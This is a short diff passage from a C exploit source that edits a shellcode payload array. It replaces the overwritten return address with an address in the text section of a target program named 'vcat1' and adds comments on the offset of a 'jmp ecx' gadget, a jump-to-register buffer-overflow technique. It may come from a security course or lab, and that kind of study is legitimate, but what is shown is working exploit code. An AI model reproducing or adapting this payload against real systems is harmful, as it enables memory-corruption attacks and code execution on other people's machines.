@@ -99,7 +99,9 @@ unsigned char payload[] =
 	"\xcd\x80"	/* int    $0x80		*/
 	/* ------------------------------------	*/
 	// Put the address of the buffer here (we think)
-	"\x10\xb6\xff\xbf"
+	"\x3d\x5f\xe8\xb5"
+	// 0xb5e85f3d is start of text section in memory for vcat1
+	// 0x14e4d is offset for "ff e1" (the jump ecx command)
 	;
 
 int
